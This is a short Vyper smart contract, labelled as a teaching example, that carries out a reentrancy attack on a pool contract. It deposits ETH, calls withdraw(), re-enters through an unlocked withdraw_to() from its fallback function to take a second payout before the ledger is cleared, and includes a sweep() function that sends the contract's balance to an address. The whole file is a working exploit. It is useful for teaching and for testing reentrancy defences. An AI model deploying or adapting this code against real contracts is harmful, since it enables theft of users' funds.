# @version 0.3.10
# TEACHING EXAMPLE. Do not deploy. See README.md.
#
# Deposits a small amount, calls withdraw(), and when the native-ETH payout runs
# this contract's __default__, re-enters through the unlocked withdraw_to() to
# collect a second payout before the first call zeroes the ledger.

interface Pool:
    def deposit(): payable
    def withdraw(): nonpayable
    def withdraw_to(recipient: address): nonpayable

pool: public(address)
reentered: public(bool)


@external
def __init__(_pool: address):
    self.pool = _pool


@external
@payable
def attack():
    Pool(self.pool).deposit(value=msg.value)
    Pool(self.pool).withdraw()


@external
@payable
def __default__():
    # This runs because the pool paid us in NATIVE ETH. An ERC20 transfer would
    # not call us here at all.
    if not self.reentered:
        self.reentered = True
        Pool(self.pool).withdraw_to(self)


@external
def sweep(to: address):
    raw_call(to, b"", value=self.balance)
